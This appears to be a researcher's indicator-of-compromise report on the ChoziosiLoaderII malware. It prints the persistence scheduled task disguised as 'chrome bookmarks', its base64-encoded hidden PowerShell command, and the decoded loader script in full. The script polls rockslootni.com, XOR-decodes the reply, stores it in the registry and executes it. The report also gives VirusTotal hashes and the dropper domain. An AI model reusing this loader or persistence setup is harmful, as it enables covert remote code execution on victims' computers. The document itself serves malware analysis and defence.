### Observed IOCs for ChoziosiLoaderII

```
first occurrence: 06-04-2022
```

### Description

I did not see any available breakdown regarding this malware, so I am documenting the observed IOCs to better understand the threat.  This will be shared to you in hopes that it will be helpful to you.  I am not the first to discover this threat, two IOCs that were similar to mine were already submitted earlier.  I will continue to gather more information over time.

### Delivery Method

Research is still ongoing regarding the delivery method.

### The Schedule task

Once the malware is executed, the following scheduled tasks are created

scheduled task #1

`C:\windows\system32\tasks\chrome bookmarks`

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Chrome bookmarks</Description>
    <URI>\chrome bookmarks</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT50M</Interval>
        <StopAtDurationEnd>true</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2022-06-06T14:14:54Z</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd</Command>
      <Arguments>/c powershell -WindowStyle Hidden -E "CgAKACQAagBkACAAPQAgACQAbgB1AGwAbAA7AAoAJABzAHQAYQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQA7AAoACgAKAAoAZgB1AG4AYwB0AGkAbwBuACAAcwBsAHQAVgBhAGwAdQBlACgAWwBzAHQAcgBpAG4AZwBdACQAYQByADIAKQAgAHsACgAJACQAYQByADEAPQBbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABhAHIAMgApADsACgAKAAkAJABzAHQAPQAkAHMAdABhAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5AFYAYQBsAHUAZQAnACkAOwAKAAkAJABlAGQAPQAkAGEAcgAxAFsAMAAuAC4ANABdADsACgAKAAkAJABpAD0AMAA7AAoACQAkAGwAPQAkAGUAZAAuAEwAZQBuAGcAdABoADsACgAJACQAawA9AEAAKAApADsACgAKAAkAWwBhAHIAcgBhAHkAXQA6ADoAUgBlAHMAaQB6AGUAKABbAHIAZQBmAF0AJABrACwAJABzAHQALgBsAGUAbgBnAHQAaAApADsACgAJAGYAbwByAGUAYQBjAGgAKAAkAGIAIABpAG4AIAAkAHMAdAApACAAewAkAGsAWwAkAGkAKwArAF0APQAkAGIAIAAtAGIAeABvAHIAIAAkAGUAZABbACQAaQAlACQAbABdAH0ACgAKAAkAJABiAHMAPQAkAGEAcgAxAFsANQAuAC4AJABhAHIAMQAuAGwAZQBuAGcAdABoAF0AOwAKAAoACQAkAGkAPQAwADsACgAJACQAbAA9ACQAawAuAEwAZQBuAGcAdABoADsACgAJACQAZAB0AD0AQAAoACkAOwAKAAoACQBbAGEAcgByAGEAeQBdADoAOgBSAGUAcwBpAHoAZQAoAFsAcgBlAGYAXQAkAGQAdAAsACQAYgBzAC4AbABlAG4AZwB0AGgAKQA7AAoACQBmAG8AcgBlAGEAYwBoACgAJABiACAAaQBuACAAJABiAHMAKQAgAHsAJABkAHQAWwAkAGkAKwArAF0APQAkAGIAIAAtAGIAeABvAHIAIAAkAGsAWwAkAGkAJQAkAGwAXQB9AAoACgAJAHIAZQB0AHUAcgBuACAAJABzAHQAYQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAHQAKQAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBKAHMAbwBuADsACgB9AAoACgAkAHYAIAA9ACAAIgAwACIAOwAKACQAbAB2ACAAPQAgACIANgAiADsACgAkAGQAIAA9ACAAIgByAG8AYwBrAHMAbABvAG8AdABuAGkALgBjAG8AbQAiADsACgAkAGUAcAAgAD0AIAAiAFcAeQBJAHgATQBEAE0AdwBOAEQAYwAxAE0AagBrAHgATwBUAFUAegBNAHoAawB6AE4AagBJAGkATABEAEUAMgBOAFQASQB6AE4AagBNADMATQBUAFIAZAAiADsACgAKACQAcABhAHQAaABSAEcAIAA9ACAAIgBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABhAGkAZwBuAGUAcwBcACIAOwAKAAoAJABqAHAAPQAkAG4AdQBsAGwAOwAKAHQAcgB5ACAAewAKAAkAJABqAHAAPQAkAHMAdABhAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABlAHAAKQApACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AOwAKAH0AIABjAGEAdABjAGgAewB9AAoACgAkAGEAIAA9ACAAJABzAHQAYQA7AAoACgAkAHUAPQAkAGoAcABbADAAXQA7AAoAJABpAHMAPQAkAGoAcABbADEAXQA7AAoACgAkAHIATgBhAG0AZQAgAD0AIAAiAGQAZQBhAGQAbABpAG4AawBzACIAOwAKAAoAdwBoAGkAbABlACgAJAB0AHIAdQBlACkAIAB7AAoACQB0AHIAeQAgAHsACgAJAAkAdAByAHkAIAB7AAoACQAJAAkAaQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAHAAYQB0AGgAUgBHACkAKQAgAHsACgAJAAkACQAJAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcABhAHQAaABSAEcAIAB8ACAATwB1AHQALQBOAHUAbABsADsACgAJAAkACQB9AAoACQAJAH0AYwBhAHQAYwBoAHsAfQAKAAoACQAJACQAZQB4ACAAPQAgACQAZgBhAGwAcwBlADsACgAKAAkACQBpAGYAIAAoACQAagBkACAALQBlAHEAIAAkAG4AdQBsAGwAKQAgAHsACgAJAAkACQB0AHIAeQAgAHsACgAJAAkACQAJACQAcgAgAD0AIABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5AFYAYQBsAHUAZQAgAC0AUABhAHQAaAAgACQAcABhAHQAaABSAEcAIAAtAE4AYQBtAGUAIAAkAHIATgBhAG0AZQA7AAoACQAJAAkACQAkAGoAZAAgAD0AIABzAGwAdABWAGEAbAB1AGUAKAAkAHIAKQA7AAoACgAJAAkACQAJACQAdgAgAD0AIAAkAGoAZABbADAAXQA7AAoACgAJAAkACQAJACQAZQB4ACAAPQAgACQAdAByAHUAZQA7AAoACQAJAAkAfQBjAGEAdABjAGgAewB9AAoACQAJAH0AIABlAGwAcwBlACAAewAKAAkACQAJACQAdgAgAD0AIAAkAGoAZABbADAAXQA7AAoACQAJAH0ACgAKAAkACQB0AHIAeQAgAHsACgAJAAkACQAkAGQAdAAgAD0AIAB3AGcAZQB0ACAAIgBoAHQAdABwAHMAOgAvAC8AJABkAC8AeAA/AHUAPQAkAHUAJgBpAHMAPQAkAGkAcwAmAGwAdgA9ACQAbAB2ACYAcgB2AD0AJAB2ACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnADsACgAKAAkACQAJACQAagBkADIAIAA9ACAAcwBsAHQAVgBhAGwAdQBlACgAJABkAHQAKQA7AAoACQAJAAkAaQBmACAAKAAkAGoAZAAyAFsAMABdACAALQBnAHQAIAAkAHYAKQAgAHsACgAJAAkACQAJACQAdgAyACAAPQAgACQAagBkADIAWwAwAF0AOwAKAAoACQAJAAkACQBOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJABwAGEAdABoAFIARwAgAC0ATgBhAG0AZQAgACQAcgBOAGEAbQBlACAALQBWAGEAbAB1AGUAIAAkAGQAdAAgAC0AUAByAG8AcABlAHIAdAB5AFQAeQBwAGUAIAAiAFMAdAByAGkAbgBnACIAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAOwAKAAkACQAJAAkAJABqAGQAIAA9ACAAJABqAGQAMgA7AAoACQAJAAkACQAkAGUAeAAgAD0AIAAkAHQAcgB1AGUAOwAKAAkACQAJAH0ACgAJAAkAfQBjAGEAdABjAGgAewB9AAoACgAJAAkAaQBmACAAKAAkAGUAeAAgAC0AZQBxACAAJAB0AHIAdQBlACkAIAB7AAoACQAJAAkAdAByAHkAewAKAAkACQAJAAkAcwB0AG8AcAA7AAoACQAJAAkAfQBjAGEAdABjAGgAewB9AAoACgAJAAkACQB0AHIAeQAgAHsACgAJAAkACQAJAGkAZQB4ACAAJABqAGQAWwAxAF0AOwAKAAkACQAJAH0AYwBhAHQAYwBoAHsAfQAKAAkACQB9AAoACQB9ACAAYwBhAHQAYwBoAHsAfQAKAAoACQB0AHIAeQAgAHsACgAJAAkAJABzAGwAcwAgAD0AIAAoACgAZwBlAHQALQByAGEAbgBkAG8AbQAgADcAMAAgAC0AbQBpAG4AaQBtAHUAbQAgADUAMAApACoANgAwACkAOwAKAAkACQAkAHQAcwAgAD0AIABbAGkAbgB0AF0AKABHAGUAdAAtAEQAYQB0AGUAIAAtAFUARgBvAHIAbQBhAHQAIAAlAHMAKQA7AAoACgAJAAkAOgBzAGwAIAB3AGgAaQBsAGUAKAAkAHQAcgB1AGUAKQAgAHsACgAJAAkACQB0AHIAeQB7AAoACQAJAAkACQByAHUAbgAoACQAZAAsACQAdQAsACQAaQBzACkAOwAKAAkACQAJAH0AYwBhAHQAYwBoAHsAfQAKAAoACQAJAAkAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAKABnAGUAdAAtAHIAYQBuAGQAbwBtACAANgA1ACAALQBtAGkAbgBpAG0AdQBtACAAMgA1ACkAOwAKAAkACQAJACQAdABzADIAIAA9ACAAWwBpAG4AdABdACgARwBlAHQALQBEAGEAdABlACAALQBVAEYAbwByAG0AYQB0ACAAJQBzACkAOwAKAAoACQAJAAkAaQBmACAAKAAoACQAdABzADIALQAkAHQAcwApACAALQBnAHQAIAAkAHMAbABzACkAIAB7AAoACQAJAAkACQBiAHIAZQBhAGsAIABzAGwAOwAKAAkACQAJAH0ACgAJAAkAfQAKAAkAfQAgAGMAYQB0AGMAaAB7AH0ACgB9AA=="</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>redactedusername</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
</Task>
```

Scheduled task #2

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\TREE\chrome bookmarks

Property   Type Value
--------   ---- -----
SD       Binary (0x)01,00,04,80,94,00,00,00,b0,00,00,00,00,00,00,00,14,00,00,00,02,00,80,00,04,00,00,00,00,10,18,00,9f,01,1f,00,01,02,00,00,00,00,00,0
                5,20,00,00,00,20,02,00,00,00,10,14,00,9f,01,1f,00,01,01,00,00,00,00,00,05,12,00,00,00,00,10,24,00,ff,01,1f,00,01,05,00,00,00,00,00,05,
                15,00,00,00,bd,00,99,7c,1b,27,8c,bf,73,50,5f,d6,e9,03,00,00,00,00,24,00,89,00,12,00,01,05,00,00,00,00,00,05,15,00,00,00,bd,00,99,7c,1b
                ,27,8c,bf,73,50,5f,d6,e9,03,00,00,00,00,00,00,01,05,00,00,00,00,00,05,15,00,00,00,bd,00,99,7c,1b,27,8c,bf,73,50,5f,d6,e9,03,00,00,01,0
                5,00,00,00,00,00,05,15,00,00,00,bd,00,99,7c,1b,27,8c,bf,73,50,5f,d6,01,02,00,00
Id       String {15DF158E-0B9C-4CBC-B177-C0569B5635C4}
Index     DWord 3

```

### Execution of scheduled task

The following base64 decoded PowerShell script is then loaded in memory.

https://www.virustotal.com/gui/file/2f8462ee6a1055e5ec0ac139deed546b5bdf4251bddb7de67106c3b43ce0d552/details

```powershell
$jd = $null;
$sta=[System.Text.Encoding]::ASCII;



function sltValue([string]$ar2) {
	$ar1=[System.Convert]::FromBase64String($ar2);

	$st=$sta.GetBytes('Get-ItemPropertyValue');
	$ed=$ar1[0..4];

	$i=0;
	$l=$ed.Length;
	$k=@();

	[array]::Resize([ref]$k,$st.length);
	foreach($b in $st) {$k[$i++]=$b -bxor $ed[$i%$l]}

	$bs=$ar1[5..$ar1.length];

	$i=0;
	$l=$k.Length;
	$dt=@();

	[array]::Resize([ref]$dt,$bs.length);
	foreach($b in $bs) {$dt[$i++]=$b -bxor $k[$i%$l]}

	return $sta.GetString($dt) | ConvertFrom-Json;
}

$v = "0";
$lv = "6";
$d = "rockslootni.com";
$ep = "WyIxMDMwNDc1MjkxOTUzMzkzNjIiLDE2NTIzNjM3MTRd";

$pathRG = "HKCU:\Software\aignes\";

$jp=$null;
try {
	$jp=$sta.GetString([System.Convert]::FromBase64String($ep)) | ConvertFrom-Json;
} catch{}

$a = $sta;

$u=$jp[0];
$is=$jp[1];

$rName = "deadlinks";

while($true) {
	try {
		try {
			if (!(Test-Path $pathRG)) {
				New-Item -Path $pathRG | Out-Null;
			}
		}catch{}

		$ex = $false;

		if ($jd -eq $null) {
			try {
				$r = Get-ItemPropertyValue -Path $pathRG -Name $rName;
				$jd = sltValue($r);

				$v = $jd[0];

				$ex = $true;
			}catch{}
		} else {
			$v = $jd[0];
		}

		try {
			$dt = wget "https://$d/x?u=$u&is=$is&lv=$lv&rv=$v" -UseBasicParsing;

			$jd2 = sltValue($dt);
			if ($jd2[0] -gt $v) {
				$v2 = $jd2[0];

				New-ItemProperty -Path $pathRG -Name $rName -Value $dt -PropertyType "String" -Force | Out-Null;
				$jd = $jd2;
				$ex = $true;
			}
		}catch{}

		if ($ex -eq $true) {
			try{
				stop;
			}catch{}

			try {
				iex $jd[1];
			}catch{}
		}
	} catch{}

	try {
		$sls = ((get-random 70 -minimum 50)*60);
		$ts = [int](Get-Date -UFormat %s);

		:sl while($true) {
			try{
				run($d,$u,$is);
			}catch{}

			Start-Sleep (get-random 65 -minimum 25);
			$ts2 = [int](Get-Date -UFormat %s);

			if (($ts2-$ts) -gt $sls) {
				break sl;
			}
		}
	} catch{}
}
```

Two PowerShell scripts were uploaded to Virus total by other users earlier this month. Thank you to Twitter user @cbecks_2 for providing the VT links below.

https://www.virustotal.com/gui/file/f316ea9158ba6704346ccd40b75b7c8d936c757282e1b476f0d42bc2f745dbdd/relations  
https://www.virustotal.com/gui/file/f3dca53c94c49283bf2a116482b6fdcda777c7c07c53d67833da03b93289fdbb/relations  

Dropper domain: rockslootni[.]com

### The dropped payload

Research is still ongoing regarding the dropped payload.
